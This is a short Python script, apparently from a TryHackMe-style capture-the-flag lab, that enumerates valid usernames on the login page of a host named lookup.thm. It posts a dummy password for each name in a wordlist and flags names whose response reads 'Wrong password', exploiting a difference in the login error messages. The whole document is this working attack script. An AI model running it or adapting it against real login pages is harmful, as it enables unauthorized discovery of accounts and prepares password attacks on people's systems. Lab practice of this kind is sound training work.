import requests

url = "http://lookup.thm/login.php"
for username in open("names.txt"):
    username = username.strip()
    if not username: 
        continue
    data = {"username": username, "password": "randompass"}
    r = requests.post(url, data=data)
    if "Wrong password" in r.text:
        print(f"[+] Valid username found: {username}")
